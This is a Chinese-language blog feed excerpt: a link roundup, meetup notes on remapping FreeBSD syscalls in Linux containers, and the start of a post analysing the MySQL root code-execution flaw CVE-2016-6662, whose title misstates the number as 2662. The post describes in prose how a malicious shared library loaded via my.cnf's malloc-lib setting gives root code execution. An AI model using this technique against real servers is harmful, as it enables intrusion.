&lt;li&gt;一个领域学习1，2个就好了. 比如web框架. 只要学好django或者flask, 理解原理. 用什么框架已经不重要了  &lt;/li&gt;
&lt;li&gt;好好学习一个编辑器. 驾驭好它, 让它提高你的工作效率.  &lt;/li&gt;
&lt;li&gt;python学的不够深入, 建议我在细节上一个一个的抠, 力争弄清楚每一个, 积少成多  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;後來做的努力  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;去某公司面试前, 或者立志要去该公司. 最好先了解公司用到的python相关的技术栈, 这样可以有针对的准备相关内容  &lt;/li&gt;
&lt;li&gt;针对性的准备想要做的职位的python技能需求. 比如面试运维开发, 多准备系统, 数据库, 配置管理相关的知识, 比如web框架(除非了解到该职位需要)  &lt;/li&gt;
&lt;li&gt;及时关注python技能最新用法, 或者推荐用法. 多了解python3的趋势, 有可能会被面试官问到.  &lt;/li&gt;
&lt;li&gt;有个github账号. 能把自己的想法实践出来的python项目, 这样就多了了解你的机会. 可能在面试中就会少问你对应的技术点  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;收錄一下面試題目的連結們  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href="http://programmers.stackexchange.com/questions/21917/python-interview-questions"&gt;http://programmers.stackexchange.com/questions/21917/python-interview-questions&lt;/a&gt;&lt;br /&gt;
&lt;a href="https://github.com/sigmavirus24/python-interview-questions"&gt;https://github.com/sigmavirus24/python-interview-questions&lt;/a&gt;&lt;br /&gt;
&lt;a href="https://gist.github.com/xiangzhuyuan/7454001522d275021b2d"&gt;https://gist.github.com/xiangzhuyuan/7454001522d275021b2d&lt;/a&gt;&lt;br /&gt;
&lt;a href="https://github.com/ContinuumIO/interview-questions"&gt;https://github.com/ContinuumIO/interview-questions&lt;/a&gt;&lt;br /&gt;
&lt;a href="https://github.com/Flowerowl/python_articles"&gt;https://github.com/Flowerowl/python_articles&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://marselester.com/preparation-to-python-interview.html"&gt;http://marselester.com/preparation-to-python-interview.html&lt;/a&gt;&lt;br /&gt;
&lt;a href="https://github.com/zachwill/cracking-the-coding-interview"&gt;https://github.com/zachwill/cracking-the-coding-interview&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://www.bogotobogo.com/python/python_interview_questions.php"&gt;http://www.bogotobogo.com/python/python_interview_questions.php&lt;/a&gt;&lt;br /&gt;
&lt;a href="https://www.quora.com/What-are-good-Python-interview-questions"&gt;https://www.quora.com/What-are-good-Python-interview-questions&lt;/a&gt;&lt;br /&gt;
&lt;a href="https://www.reddit.com/r/Python/comments/1knw7z/python_interview_questions"&gt;https://www.reddit.com/r/Python/comments/1knw7z/python_interview_questions&lt;/a&gt;&lt;br /&gt;
&lt;a href="https://github.com/1st/interview/blob/master/python.md"&gt;https://github.com/1st/interview/blob/master/python.md&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;还有2个中文:  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/taizilongxu/interview_python"&gt;https://github.com/taizilongxu/interview_python&lt;/a&gt;&lt;br /&gt;
&lt;a href="https://gist.github.com/prim/3e7f814187c715541ef2"&gt;https://gist.github.com/prim/3e7f814187c715541ef2&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;tool&lt;/h3&gt;
&lt;p&gt;就一些檢測中國網路連線狀況的工具，&lt;br /&gt;
最近工作上再處理一個把網站架在中國網路的大客戶，&lt;br /&gt;
所以一直遇到跟中國網路有關的問題，&lt;br /&gt;
之後有空應該會整理成一篇文章吧。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://tools.cloudxns.net/"&gt;首頁 --CloudXNS 運維工具箱_智能 DNS 運維工具箱_最好用的 DNS 檢測工具_永久免費&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://ping.chinaz.com/"&gt;多个地点Ping服务器,网站测速 - 站长工具&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/35239964"&gt;宇宙中有哪些超出常人想像的現象？ - 自然科學 - 知乎&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最多人按讚的那個算是滿易懂的有關黑洞的天文科普吧。  &lt;/li&gt;
&lt;li&gt;想起高中科展做的有關黑洞的專題啊...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.mobile01.com/topicdetail.php?f=177&amp;amp;t=83330"&gt;蘋果週邊綜合 - 大家的電腦桌周邊是如何～分享一下吧＠＠ - 蘋果討論區 - Mobile01&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;我的天啊... 十年前的電腦配置的照片，好懷念啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Baseball/M.1457362742.A.F5B.html"&gt;Re: [問題] 為何陳金鋒是神?&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;雖然沒有很常看棒球但淚推 QQ  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/cowbeiNTHU/posts/1087778498001953"&gt;靠北清大&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇好中肯啊，只好附個截圖了。  &lt;/li&gt;
&lt;li&gt;&lt;img alt="靠北清大38597" src="/files/y2016w38/cowbeiNTHU38597.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://cool.ptt01.cc/post_1213"&gt;10 年過了！當年「宋岳庭」打敗方文山和周杰倫的『Life's A Struggle』終於聽懂這首歌它在說什麼！，回頭才知道他早已不在人世... | &lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;真的好好聽啊，聽了以後就停不下來了。  &lt;/li&gt;
&lt;li&gt;公視人生劇展短篇影集《他們在畢業前一天爆炸》有出現這首歌，以前看的時候完全沒有注意到，這個週末耍廢花了一個下午重看一次，才發現這首歌原來這麼猛。  &lt;/li&gt;
&lt;li&gt;第一次聽到這麼清楚的 Rap，而且歌詞不是亂罵一堆有的沒的髒話，是對這個社會的諷刺還有個人的反思，可惜天妒英才。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ptt&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/gossiping/M.1474389994.A.56D.html"&gt;Re: [問卦] 交大讀四年，母豬賽貂蟬？ - 看板 Gossiping - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;交大唸了四年，完全沒聽過虎二... 只好節錄一下了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;講到虎二喔?  &lt;/p&gt;
&lt;p&gt;那就來講虎二掘起的八卦吧。  &lt;/p&gt;
&lt;p&gt;話說男生多的地方必定要尻尻，沒有色情圖片也要有色情小說。  &lt;/p&gt;
&lt;p&gt;在民國八十年那個蠻荒時代，交大獨步全台，做為施振榮的母校，&lt;br /&gt;
網路大管電腦多，在別的學校網路只拉到計算機中心的時代，&lt;br /&gt;
交大就把網路拉到學生宿舍，在別的學校一個學校建一個 BBS 的&lt;br /&gt;
時代，交大就已經進入了一間房間四個 BBS 的光榮時代。  &lt;/p&gt;
&lt;p&gt;網路元年大家只能登入學校工作站，按學號找人 Talk。  &lt;/p&gt;
&lt;p&gt;要練英文。  &lt;/p&gt;
&lt;p&gt;所以當年的網路文章充滿了  &lt;/p&gt;
&lt;p&gt;ji31vu042y941ulgji 15j/ 1jp61531s/61m/415k415j/31z; 1z831&lt;br /&gt;
(我現在要說中文只能用這種方法)(注音輸入法)  &lt;/p&gt;
&lt;p&gt;這種只有聰明人才看得懂的密碼。  &lt;/p&gt;
&lt;p&gt;進入網路二年，全交大的年輕人矢志中文化，不論是中文化 VTerm&lt;br /&gt;
還是中文化 XWindow, 總之，想盡辦法講中文。  &lt;/p&gt;
&lt;p&gt;而有了網路就有論壇，最早當然就是 Mail List 與 USENEWS，&lt;br /&gt;
交大資工的學生很早就都使用 TIN/CTIN 在看 News, 學校的論壇&lt;br /&gt;
不是用 Notes 就是用 News；當然，最可怕的就是交大總計中&lt;br /&gt;
的 Notes 系統上的 Anonymous 板，那可是集中所有反政府學生&lt;br /&gt;
討論如何對抗學校當局的言論中心。  &lt;/p&gt;
&lt;p&gt;然後，在民國八十二年四月就發生了  &lt;/p&gt;
&lt;p&gt;「拒吃二餐快餐部運動」  &lt;/p&gt;
&lt;p&gt;與  &lt;/p&gt;
&lt;p&gt;「在環校道路上散步運動」  &lt;/p&gt;
&lt;p&gt;前者是為了對抗難吃到要命的交大二餐快餐部，結果就是運動當天晚上&lt;br /&gt;
快餐部營業額是 0 (相對的我在自助餐當工讀生夾菜夾到手快要斷掉..)  &lt;/p&gt;
&lt;p&gt;後者則是針對交大特有的「睦鄰行為」: 允許園區上下班汽機車通過交大&lt;br /&gt;
校園通勤卻禁止交大學生在校內騎機車。  &lt;/p&gt;
&lt;p&gt;結果當天在交大行政大樓前聚集了大約三四百名學生，讓計中主任都出來&lt;br /&gt;
說話:「我們絕對不會關掉 Note」.....  &lt;/p&gt;
&lt;p&gt;(當天晚上 Notes 系統就變成唯讀禁止發言，所謂交大校方的說話與國民黨&lt;br /&gt;
 政府的保證一樣完全是放P。)  &lt;/p&gt;
&lt;p&gt;好，沒有了 Notes,  BBS 興起了。  &lt;/p&gt;
&lt;p&gt;民國八十一年中山大學建置了西子灣 BBS 站。坦白說我同學當初介紹我用&lt;br /&gt;
的時候我還覺得它的介面靠北難用(不過跟現在 PTT 一樣)。不過呢，&lt;br /&gt;
連中山那個鄉下學校都有了 BBS ，交大怎能沒有?  &lt;/p&gt;
&lt;p&gt;所以那年春天在計中關閉了 Notes 系統之後，交大各系如雨後狗尿苔一樣&lt;br /&gt;
建立了各式BBS..........BBS一多，逛 BBS 就很不方便，每次都要登入&lt;br /&gt;
各個 BBS 去看文章。  &lt;/p&gt;
&lt;p&gt;於是我們系上就開始想到利用 News Server 把各大 BBS 的文章統一轉載，&lt;br /&gt;
也就是民國八十年代所謂的  &lt;/p&gt;
&lt;p&gt;連線板  &lt;/p&gt;
&lt;p&gt;而在那個法律管不到的時代呢，自然 SEX 板上就開始有人講色情話題，久了&lt;br /&gt;
之後女性不堪其擾屢屢找我們網管靠北，還說我們不處理就讓校方來處理....  &lt;/p&gt;
&lt;p&gt;開玩笑，讓校方處理跟關站沒啥兩樣。  &lt;/p&gt;
&lt;p&gt;於是，SEX 板就分流出一個 SEXSTORY 板，專放色情小說，提供登徒子們滿足&lt;br /&gt;
性幻想的園地。  &lt;/p&gt;
&lt;p&gt;一時間，連線 SEXSTORY 板成了最紅的板面。  &lt;/p&gt;
&lt;p&gt;人紅是非多，板紅有人找碴，沒多久交大資工系接獲政府公文說有人利用&lt;br /&gt;
學術網路刊載色情資訊違反善良風俗等廢話五千言，限時刪除。  &lt;/p&gt;
&lt;p&gt;此時，網路傳奇名人 Tiger 2 學弟就跳出來說:  &lt;/p&gt;
&lt;p&gt;「這樣吧，我捐一台電腦來放這些資料....」  &lt;/p&gt;
&lt;p&gt;於是全台最著名的地下 BBS 站，需要有人介紹才能找到 IP 登入的 Tiger 2&lt;br /&gt;
站就此誕生。  &lt;/p&gt;
&lt;p&gt;爾後此站幾度易手，學長傳學弟，一路不知所終，而 Tiger 2 學弟也去澳洲&lt;br /&gt;
開公司放牧綿羊好不快活，喝的酒都比俺的薪水還多。  &lt;/p&gt;
&lt;p&gt;回首前塵不覺已二十數年矣....................  &lt;/p&gt;
&lt;/blockquote&gt;</summary><category term="django"></category><category term="docker"></category><category term="firefox"></category><category term="cli"></category><category term="htop"></category><category term="job"></category><category term="misc"></category><category term="programmer"></category><category term="ptt"></category><category term="python"></category><category term="taiwan"></category><category term="tol"></category><category term="tool"></category><category term="trivia"></category></entry><entry><title>Cat System Workshop #11 Dynamically Hacking the Kernel with Containers</title><link href="https://blog.m157q.tw/posts/2016/09/21/cat-system-workshop-11-dynamically-hacking-the-kernel-with-containers/" rel="alternate"></link><published>2016-09-21T03:50:25+08:00</published><updated>2016-09-21T03:50:25+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-09-21:posts/2016/09/21/cat-system-workshop-11-dynamically-hacking-the-kernel-with-containers/</id><summary type="html">&lt;h2&gt;Info&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;活動網址：&lt;a href="http://www.accupass.com/go/cat0920"&gt;http://www.accupass.com/go/cat0920&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Spaker: 高魁良  &lt;/li&gt;
&lt;li&gt;Slides:&lt;a href="http://www.slideshare.net/QueyLiangKao/talk-160920-cat-system-workshop-66199432"&gt;Talk 160920 @ Cat System Workshop&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;講者在 ContainerCon Japan 2016 的投影片： &lt;a href="http://events.linuxfoundation.org/sites/events/files/slides/talk_7.pdf"&gt;Dynamically Hacking the Kernel with Containers - ContainerCon Japan 2016 Tokyo - Quey-Liang Kao - National Tsing Hua University, Taiwan&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Note&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;稍微提到了一下 Live Kernel Patching  &lt;/li&gt;
&lt;li&gt;Kernel Detouring  &lt;ul&gt;
&lt;li&gt;有點類似 Rootkit 的感覺  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Intel 也有在開發 Container，叫作 Clear Container，最近公佈了 2.0 版。  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://clearlinux.org/clear-containers"&gt;https://clearlinux.org/clear-containers&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;可以在 Linux 的機器上跑 FreeBSD 的 container，透過換掉 System call 的 table 來達成。  &lt;/li&gt;
&lt;li&gt;Specific Challengs (FreeBSD)  &lt;ul&gt;
&lt;li&gt;Corresponding system calls  &lt;ul&gt;
&lt;li&gt;Flag numbers are not portable  &lt;/li&gt;
&lt;li&gt;Different calling/exiting conventions  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unique system calls  &lt;ul&gt;
&lt;li&gt;Re-implementation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;General Challenges  &lt;ul&gt;
&lt;li&gt;Insufficient isolation  &lt;/li&gt;
&lt;li&gt;Limitation of development  &lt;ul&gt;
&lt;li&gt;live patching should only be a temporary solution.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Other Binary Compatibility Work  &lt;ul&gt;
&lt;li&gt;Wine  &lt;ul&gt;
&lt;li&gt;Special loader for PEs/DLLs  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;FreeBSD, Windows 10  &lt;ul&gt;
&lt;li&gt;Kernel built-in compatibility layer for Linux binary.  &lt;ul&gt;
&lt;li&gt;FreeBSD i386  &lt;/li&gt;
&lt;li&gt;Windows 10: Ubuntu on Windows 10 也是用類似的方法  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;System call remapping/re-implementation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;How&lt;/h2&gt;
&lt;h3&gt;Step 0: Setup&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Environment (x86_64 maching)  &lt;ul&gt;
&lt;li&gt;Linux 4.6.2  &lt;/li&gt;
&lt;li&gt;FreeBSD 10.2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tools  &lt;ul&gt;
&lt;li&gt;kpatch: A tool for kernel livepatch  &lt;/li&gt;
&lt;li&gt;docker  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Step 1: From LivePatching to Detouring&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;kernel/livepatch/core.c.orig:klp_ftrace_handler  

klp_arch_set_pc(regs, (unsigned long)func-&amp;gt;new_func);  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;目前 LivePatching 最成熟的還是在 x86 的 machine 上  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Ftrace in LivePatching&lt;/h4&gt;
&lt;p&gt;在 kernel 的 config 中要 enable &lt;code&gt;ftrace&lt;/code&gt; 和 &lt;code&gt;fentry&lt;/code&gt;&lt;br /&gt;
可以透過 ftrace 去抓到每個 function 被 call 的時間點。  &lt;/p&gt;
&lt;h4&gt;Ftrace in Detouring&lt;/h4&gt;
&lt;h3&gt;Step 2: Detour-able Entry Point&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Assembly file is NOT detour-able  &lt;ul&gt;
&lt;li&gt;順便一提，也不支持 in-line function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Step 3: Detoured Entry Point&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;maintain 一個 FreeBSD 的 system call table (不是一個 function pointer 的 table)  &lt;/li&gt;
&lt;li&gt;達到 remapping syscall 的效果  &lt;/li&gt;
&lt;li&gt;目前是用苦功寫死一個一個對應  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;cat maps | wc -l&lt;/code&gt; 有 149 個可以互相對應的  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;cat syscall.h | wc -l&lt;/code&gt; 468 FreeBSD 的 syscall  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;cat unistd_64.h | wc -l&lt;/code&gt; 332 Linux 的 syscall  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;The workflow&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Launch a normal container  &lt;/li&gt;
&lt;li&gt;Run a init script  &lt;ul&gt;
&lt;li&gt;which enables the specific detour modules  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A FreeBSD environment in the container  &lt;/li&gt;
&lt;li&gt;On exit  &lt;ul&gt;
&lt;li&gt;disable detour modules  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;Demo&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Truss_(Unix)"&gt;truss (Unix) - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Linux 跟 FreeBSD 的 &lt;code&gt;execve&lt;/code&gt; 剛好是同個號碼  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;總結&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;The kernel detouring demo attempts to indicate a possible movement of the development of OS containers  &lt;ul&gt;
&lt;li&gt;as a proof-of-concept  &lt;/li&gt;
&lt;li&gt;kpatch as a temporary solution  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Future direction  &lt;ul&gt;
&lt;li&gt;Make more fun  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;一些討論&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;自己寫一個 ftrace handler 改掉 detour 的 destination 可能會是比較好的作法。  &lt;/li&gt;
&lt;li&gt;講者在日本的 ContainerCon 給 talk 的時候有人給了 &lt;code&gt;execution domain&lt;/code&gt; 這個關鍵字。  &lt;ul&gt;
&lt;li&gt;Linux 在 2015 前有個東西叫作，&lt;a href="https://linux.die.net/man/2/personality"&gt;execution domain&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;BSD 的部份是沒有實作的。(no effects.)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這邊只有針對 syscall 的 entry point 去改,沒有要 hook 到多深，也許會覺得用 ftrace 太 powerful，何不改寫 ptrace 就好。或是直接使用 user space Linux 等等。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.freebsd.org/doc/en_US.ISO8859-1/articles/linux-emulation/article.html"&gt;Linux® emulation in FreeBSD&lt;/a&gt;  &lt;blockquote&gt;
&lt;p&gt;想當初修 SA 的時候 flash player 在 FreeBSD 上編不起來好像就是用這招。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;幕後花絮&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;How to implement the &lt;code&gt;is_freebsd_container()&lt;/code&gt; function?  &lt;/li&gt;
&lt;li&gt;How was the ContainerCon Japan?  &lt;ul&gt;
&lt;li&gt;跟當地的社群互動滿有趣的  &lt;/li&gt;
&lt;li&gt;會議室比較高級、沒有 host、會幫你準備好投影機、白板。  &lt;/li&gt;
&lt;li&gt;講者：「我覺得可以考慮不要去。」 （眾：XDDDD）  &lt;ul&gt;
&lt;li&gt;「裏面有一半以上的講者是日本人，腔調不是問題，主要是單位時間內的資訊密度，很多講者為了把發音腔調正確會講得很慢。」  &lt;ul&gt;
&lt;li&gt;jserv: 「日本砸了很多錢在這上面，所以有一半以上的講者是日本人很正常的。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「然後很多講者的問答時間都沒有人理。」  &lt;ul&gt;
&lt;li&gt;jserv: 「他們可能都已經在公司聽過同事講過完整的日文版了，只是來這邊聽比較沒那麼完整的英文版。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「日本人用 Twitter 用很兇，有位老老的日本人在我演講完後問了很多的問題，然後問我有沒有用 Twitter，把我加到了一個討論 Container 的 Group 裏面。我才發現他在聽我演講的時候發了很多推，然後這些推底下都有他的推友在討論，有提到 Execution domain，也有說我的某頁簡報毫無意義的評論，於是我用我沒那麼好的日文跟他們來來回回得回覆，但不知道是不是我的日文用字拿捏的不好，隔天我發現他們全都取消追蹤我而且還把我踢出那個討論 container 的 group。」  &lt;ul&gt;
&lt;li&gt;xatier：「一定是沒跟他們喝酒的關係，日本人都是喝了酒馬上就熟了。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「有位中國人看到我投影片的第一頁，就跑過來問我說：『你清華的啊？』『嗯，但我是臺灣的清華』然後他就當著我的面拿著他的東西走出去了。」  &lt;ul&gt;
&lt;li&gt;jserv：「你下次遇到這種就要直接跟他講英文，他跟你用中文你還是一直跟他說英文，不然像你這樣整個就弱掉了。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;覺得 jserv 後來跟講者講的一些東西也頗值得紀錄一下的：  &lt;ul&gt;
&lt;li&gt;「你去了 Linux Foundation 辦的 Conference 一趟應該就知道當講者的不是超級大的公司就是超級小的公司，像你這種只有學生身份的是非常少的。」「對啊，有位和我討論的德國人也有聊到，他直接就說他覺得是主辦單位找不到足夠的講者才找我。」「也好啦，至少是一次出去看看的經驗。」  &lt;/li&gt;
&lt;li&gt;「看到滿多人說我的演講跟他們預期的有落差。」「你這次去就知道他們都是業界的工程師，你的摘要就輸人家了，人家 Twitter 是講幾萬台伺服器的佈署、Facebook 是講二十億使用者的資料分析」「對啊，我講的東西根本沒有 scale。」「他們很多人是公司出錢讓他們來的，最便宜的門票一張也要五百多鎂，你講的東西太空洞讓他們沒辦法寫報告的話，交不出報告就會被主管罵。」  &lt;/li&gt;
&lt;li&gt;「你的題目是還不錯，開始演講時的高度是在這，但你講完以後高度只有上升一點點。」「程式碼的部份放的太少算是我的失策。」「你的簡報太早做完了，你應該在聽完第一場 keynote 的時候就會知道日本這邊大概喜歡怎麼樣的簡報，你就要在這個時候開始修改你的簡報。」「哦對，日本人好像超級喜歡格言，看到有一個 keynote 講者，一開始的十張投影片全部都是格言然後搭配文青風格的照片背景，滿受大家歡迎的。」  &lt;/li&gt;
&lt;li&gt;「你這個演講就是缺乏應用的部份，因為參加的都是真的在業界的工程師，所以他們會希望看到你講的東西解決了什麼問題，如果沒有這部份的話，只會讓他們覺得『靠，又是一個窮學生來這邊講論文。』我覺得你這個可以考慮弄個 IDS，因為 syscall 都是抽換掉的，所以不用怕，甚至可以重現一堆 CVE，來分析攻擊者的行為。」「對耶，滿多人後來反應演講跟預期有落差的時候，我就有聽到我後面的人在用日語說『原來是學生而且還是做 High Performance Computing 又不是研究 Container 的，難怪』之類的。」「下次你就要問問看有沒有公司願意讓你掛名，你就可以放在投影片上，這樣就比較不會被這些業界的工程師看不起，你的英文表達能力基本上已經超過他們一半在場的日本工程師啦。」  &lt;/li&gt;
&lt;li&gt;「演講就是要安排暗樁啊，不然聽眾很容易聽到睡著的。像你的演講是第三天的上午，前面兩天就要儘量去認識人，然後跟他們稍微賣點關子，請他們來聽你的演講。」  &lt;/li&gt;
&lt;li&gt;「Linux Foundation 對於演講順序的安排是有根據的，不只是演講的內容，也會去查一下這個講者的影響力還有做了哪些事情，評價愈高的當然就是 keynote spearker。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Kernel"></category><category term="Containers"></category><category term="Cat System Workshop"></category><category term="Meetup"></category></entry><entry><title>CVE-2016-2662</title><link href="https://blog.m157q.tw/posts/2016/09/19/cve-2016-2662/" rel="alternate"></link><published>2016-09-19T17:46:28+08:00</published><updated>2016-09-19T17:46:28+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-09-19:posts/2016/09/19/cve-2016-2662/</id><summary type="html">&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;接近第一時間的時候稍微追了一下漏洞的 PoC，&lt;br /&gt;
雖然離事件發生也隔了好幾天了，&lt;br /&gt;
還是整理成一篇文章紀錄一下，&lt;br /&gt;
畢竟應該是今年最大的漏洞了吧？  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Note&lt;/h2&gt;
&lt;p&gt;漏洞的詳細細節都在以下這個文件：&lt;br /&gt;
&lt;a href="http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html"&gt;http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html&lt;/a&gt;&lt;br /&gt;
以下稍微紀錄之前追的時候看到的東西  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img alt="summary for CVE 2016-2662" src="/files/cve-2016-2662/1.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;這邊可以看到 MySQL 全部的版本都中獎了，&lt;br /&gt;
然後連 MariaDB 跟 PerconaDB 也中獎。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img alt="PoC of CVE 2016-2662" src="/files/cve-2016-2662/2.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;從 PoC 可以看到，&lt;br /&gt;
是透過 &lt;code&gt;mysqld_safe&lt;/code&gt; 這個 wrapper script 來作為攻擊點。  &lt;/p&gt;
&lt;p&gt;即便 &lt;code&gt;mysqld&lt;/code&gt; 不是以 &lt;code&gt;root&lt;/code&gt; 的權限執行，&lt;br /&gt;
&lt;code&gt;MySQL&lt;/code&gt; 預設仍會讓 &lt;code&gt;mysqld_safe&lt;/code&gt; 這個 wrapper script 以 &lt;code&gt;root&lt;/code&gt; 的權限執行。&lt;br /&gt;
然後 &lt;code&gt;mysqld_safe&lt;/code&gt; 裡頭有個 &lt;code&gt;set_malloc_lib&lt;/code&gt; 的 function 可以用來 preload shared library，&lt;br /&gt;
至於要 preload 什麼 shared library 可以透過執行 &lt;code&gt;mysqld&lt;/code&gt; 時加入 &lt;code&gt;--malloc-lib=$LIB&lt;/code&gt;&lt;br /&gt;
或是在 &lt;code&gt;my.cnf&lt;/code&gt; 的 &lt;code&gt;mysqld&lt;/code&gt; 或 &lt;code&gt;mysqld_safe&lt;/code&gt; 的 section 中指定路徑。  &lt;/p&gt;
&lt;p&gt;如果攻擊者將惡意的 shared library 上傳到目標伺服器，&lt;br /&gt;
然後再將 &lt;code&gt;my.cnf&lt;/code&gt; 中的 preload library 路徑改到該惡意的 shared library 的路徑，&lt;br /&gt;
則目標伺服器下次重新啟動 &lt;code&gt;mysql&lt;/code&gt; 的時候，&lt;br /&gt;
就會載入該惡意的 shared library，&lt;br /&gt;
讓攻擊者達到執行任意程式碼的攻擊，&lt;br /&gt;
